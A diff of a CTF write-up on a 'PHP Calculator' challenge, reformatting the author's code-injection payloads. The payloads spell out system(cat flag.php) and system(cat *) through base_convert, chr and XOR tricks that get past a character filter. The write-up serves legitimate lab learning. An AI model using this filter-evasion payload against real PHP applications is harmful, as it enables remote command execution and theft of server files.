@@ -1,5 +1,5 @@
 ---
-title: 'Hacking "PHP Calculator" writeup'
+title: 'Hacking "PHP Calculator" // CTF writeup'
 date: '2023-10-27'
 ---
 *[2023 update]: I actually wrote this in 2021 on my old site - I've formatted it and made minor edits but the content remains the same!*
@@ -58,12 +58,12 @@ Nice. At this point, I think I have it. All we have to do is construct 'system(c
 Unfortunately, this requires a space and a period, which we can't make from base_convert(). But, we <i>can</i>
 make 'chr()', which can take in an ASCII value and give us any character, great! The full payload is a concatenation of these parts, and the periods are PHP for string concatenation.
 
-- base_convert(1751504350,10,36) *system*
-- (base_convert(15941,10,36).    *(cat* 
-- base_convert(16191,10,36)(32). *chr(32) / space*
-- base_convert(727432,10,36).    *flag*
-- base_convert(16191,10,36)(46). *chr(46) / period*
-- base_convert(33037,10,36))     *php)*
+- base_convert(1751504350,10,36) --- "system"
+- (base_convert(15941,10,36). ------ "(cat" 
+- base_convert(16191,10,36)(32) ---- "chr(32)" / space
+- base_convert(727432,10,36). ------ "flag"
+- base_convert(16191,10,36)(46). --- "chr(46)" / period
+- base_convert(33037,10,36)) ------- "php)"
 
 Great, just paste it in, and...
 
@@ -120,8 +120,10 @@ So! Here's the final payload:
 
 
 base_convert(1751504350,10,36)(dechex(69905)^dechex(70058)^base_convert(20660471,10,36)) 
-->    system    (        '11111'   ^   '111aa'   ^            'catpz'         )) 
-->        =    system  (    cat  *  )
+
+->    system    (        '11111'   ^   '111aa'   ^            'catpz'         )
+
+->            system  (    cat  *  )
 
 
 
